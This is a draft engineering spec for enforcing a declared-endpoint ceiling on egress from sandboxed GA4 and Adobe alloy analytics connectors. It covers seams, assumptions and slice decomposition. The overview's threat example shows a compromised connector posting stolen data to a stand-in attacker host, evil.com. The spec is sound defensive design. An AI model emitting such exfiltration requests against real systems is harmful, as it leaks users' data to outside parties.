---
status: DRAFT
skill:
use_cases: [UC-1, UC-2]
---

<!-- jig self-defining vocabulary (soft, forward-only): expand each acronym on first use and link the term to docs/memory/glossary.md. -->

# Spec 016: endpoint-ceiling enforcement — a chamber can only post where it declared

## Overview

MVP3's **second enforcement spec**: make the connector manifest's `endpoints` a **ceiling it can
never exceed** ([ADR-0006](../../decisions/adr-0006-capability-manifest.md) Option B, the
`granted = declared ∩ host-policy ∩ consent` law). Today `endpoints` is **declared but advisory** —
the connector *announces* where it posts but is **not held to it**. This spec flips the **`declared`**
term to authoritative at the egress seam: a compromised chamber can only post to a destination it
**declared**, and an undeclared destination is **held at the seal** + surfaced (009-02), never a silent
drop and never a chamber-killing throw (ADR-0006 §Consequences).

**A load-bearing framing correction (grounded 2026-08-30).** ADR-0006 repeatedly argues the flip "adds
~zero over ADR-0004's host allow-list, which already blocks foreign sinks." **That host allow-list was
never built** — a grep of `core/` finds **no egress-destination gate of any kind**
(`core/airlock.js`'s worker-dispatch does a bare `fetch(r.url, …)`; the wrapped-SDK seam did nothing on
the host/path axis until 015's *tenant* check). So in the **real** codebase the declared-`endpoints`
ceiling is the **first** egress-destination gate for the wire-protocol path — it genuinely provides
**foreign-sink teeth** (a compromised GA4 chamber emitting `{ url: "https://evil.com", body: <stolen> }`
is **held**), not the "~zero delta" the ADR assumed against a pre-existing allow-list. We enforce the
`declared` term and state honestly that a *separate* host-owned allow-list (a further `∩ host-policy`
narrowing) and consent (`∩ consent`, [ADR-0007](../../decisions/adr-0007-consent-purpose-model.md)) are
**additional intersection terms deferred to their own specs**; absent a host-policy config, the enforced
set **is** the declared set.

**Granularity = origin + pathname (not the literal URL).** The ceiling compares the outbound
**origin + pathname**, dropping the query/fragment. This resolves ADR-0006 **Kill #4** (a
site-configured deploy-time URL carrying `measurement_id` / `api_secret` / cluster-hint query params
must not break the ceiling) **and** keeps secrets out of the manifest/disclosure label (declaring a
full GA4 Measurement-Protocol URL would bake `api_secret` into the manifest). "Declare an origin or a
parameterized template, not a literal" — the ADR's own Kill-#4 resolution, made concrete.

**Archetype split — GA4 is an EXACT ceiling; alloy is a FLOOR (ADR-0006 §Recommended Decision).** The
two connector archetypes are fundamentally different and the spec must not conflate them:
- **GA4 (wire-protocol, fixed endpoint)** — posts to one known Measurement-Protocol origin+path; its
  declared set is **bounded and complete**. The ceiling is **exact**: any origin+path it did not
  declare is held. `016-01`.
- **alloy (wrapped-SDK CDP)** — does **server-directed** ID-sync: the Edge response returns
  demdex/Audience-Manager sync URLs the SDK then fires, **unknowable at manifest-authoring time**
  (013-02 measured **2 Adobe-first-party origins** and **zero third-party as a LOWER BOUND** — a
  test-org artifact, not narrowness). So the alloy ceiling is a **FLOOR**: it confines the *declared*
  first-party interact origin and **discloses**, but **cannot** enumerate the server-directed sync
  destinations — named as an explicit residual, not claimed confined. `016-02`.

**Seam scope — enforce where the CHAMBER chooses the URL (grounded refinement of ADR-0006's "both
seams").** ADR-0006 §Assumptions says the ceiling "must bind at both egress seams." Grounding the three
egress paths sharpens that for the **destination** ceiling specifically:
- **async worker path** (`core/airlock.js` `worker.onmessage` → `fetch(r.url)`) — the url is
  **chamber-produced** (the worker's `ready` array); a compromised chamber can redirect it. **Gate here** (016-01).
- **wrapped-SDK round-trip** (`core/wrapped-sdk-host.js` `caps.egress.dispatch(req)`) — `req.url` is
  **chamber-produced**; already the config-integrity seam (015). **Gate here** (016-02), composed with 015.
- **synchronous unload fast path** (`core/egress.js` `createCriticalDispatcher` → `fetch(endpoints[t])`)
  — the destination is **`endpoints[t]` from host config**, constructed on the **main thread**, **not**
  chamber-chosen. So its *destination* is **already pinned by construction** — not a chamber-redirect
  surface. The destination ceiling is **trivially satisfied** there (a cheap invariant assertion +
  disclosure), so this spec does **not** add a redundant gate to the sync path. (The sync path's *open*
  problem is **payload** governance + throwing-mapper isolation — OQ16 — a *different* control, not this
  one.) This is a **refinement** of the ADR's "both seams," grounded by reading the three paths.

**Not in scope:** the `∩ host-policy` host-owned allow-list layer (a further narrowing, its own future
work — unneeded while the declared set already *is* the vendor endpoints); `∩ consent` purpose-vector
(ADR-0007, its own spec); the **payload** channel (OQ11 denylist — *what* a chamber packs into a
declared endpoint, a different door); the sync-path throwing-mapper isolation (OQ16). This spec is
**only** the destination ceiling's `declared` term.

## Assumptions

<!-- Grounded 2026-08-30 by reading core/airlock.js, core/egress.js, core/wrapped-sdk-host.js,
     connectors/{ga4,alloy}/connector.js, contracts/connector.d.ts, test/alloy-manifest-declaration.test.js,
     ADR-0004/0006; risk-gated. -->

- **No egress-destination allow-list exists in `core/` today.** Grep-verified: `core/airlock.js:63`
  is a bare `fetch(r.url, …)`; `core/egress.js` fetches `endpoints[t]`; the only destination-adjacent
  check is 015's *tenant* pin at the wrapped-SDK seam. So this ceiling is the **first** destination
  gate, not a refinement of ADR-0004's (unbuilt) allow-list. **Grounded.**
- **The async worker path's url is chamber-produced; the sync path's is config-pinned.** `core/airlock.js`
  dispatches `r.url` from the worker's `ready` array (chamber-chosen); `core/egress.js` dispatches
  `endpoints[t]` from host config (main-thread, not chamber-chosen). **Grounded** (read both).
- **GA4's declared `endpoints` == the config endpoints == its post targets.** `connectors/ga4/connector.js`
  declares `endpoints: [...new Set(config.endpoints)]` and `handle` posts `{ url: endpoints[t] }` — so
  the ceiling set is self-consistent with the deploy-time config (Kill #4 dissolved for GA4 by
  construction). **Grounded.**
- **`EgressRequest` carries no connector/chamber id** (`contracts/connector.d.ts:61`). Attribution is
  implicit in the single-connector-per-host model (one `createAirlock` → one worker → one connector);
  the ceiling checks against *that host's* connector's declared endpoints, threaded in at construction
  (the 015 config-integrity-pin precedent). Multi-chamber attribution is **forward-looking**, not built
  here. **Grounded** (single-host model verified).
- **alloy's server-directed sync breadth is a lower bound, not a map** (013-02 DONE). The alloy ceiling
  is therefore a FLOOR; a representative-AAM prod-org re-run is the deferred follow-up (already tracked).
  **Grounded** (spec 013-02 §Findings).
- **The 012-04 boundary sentinel asserts the absence of gating** (`test/alloy-manifest-declaration.test.js`
  AC2: "an alloy interact egresses WHETHER OR NOT its host matches a declared endpoint") — it is
  designed to **go red the moment enforcement lands**, and 016-02 flips it to assert the presence of
  the hold. **Grounded** (read the test).

## Decomposition

SPIDR = **Rules (R)** — a gating rule (the `endpoints` ceiling) enforced at an existing egress seam.
Split by **connector archetype** (the ADR's own division, which is a **Data**-shaped axis — the two
archetypes carry fundamentally different endpoint *data*: GA4 a bounded fixed set, alloy a
server-directed floor): the **exact** wire-protocol ceiling first (GA4 — clean pass/hold, establishes
the generic `core/` mechanism), then the **floor** CDP ceiling (alloy — composed with 015's
config-integrity, server-directed sync named as the residual). Each binds the rule at a **real chamber-
chosen-url seam end-to-end** (a compromised chamber's undeclared egress → held), so neither is horizontal.

- **016-01 `[R]` GA4 wire-protocol endpoint ceiling (the EXACT archetype)** — a generic, vendor-neutral
  `core/` endpoint-ceiling control (outbound origin+pathname ∈ the host's connector's declared
  endpoints, else HOLD) wired into the **async worker dispatch seam** (`core/airlock.js`): an undeclared
  destination is **held** (no `fetch`) + a redacted **009-02** diagnostic; the honest path is unchanged.
  The **sync path's** config-pinned destination gets a cheap invariant assertion (not a gate). E2E: a
  compromised GA4 chamber emitting a foreign-sink `ready` request is **blocked** + surfaced.
- **016-02 `[R]` alloy wrapped-SDK endpoint ceiling (the FLOOR archetype)** — apply the same `core/`
  control at the **wrapped-SDK dispatch seam** (`core/wrapped-sdk-host.js`), **composed** with 015's
  config-integrity (host/path ceiling **and** tenant pin together at one seam); **flip the 012-04
  boundary sentinel** (absence-of-gating → presence-of-hold); honestly scope alloy as a **FLOOR** —
  the declared interact origin is confined + disclosed, the **server-directed demdex/AAM sync
  destinations are a named residual** (013-02 lower bound), not claimed confined.

## Slices

1. [016-01 — GA4 wire-protocol endpoint ceiling (exact)](slice-01-ga4-wire-protocol-ceiling.md)
2. [016-02 — alloy wrapped-SDK endpoint ceiling (floor)](slice-02-alloy-wrapped-sdk-floor.md)
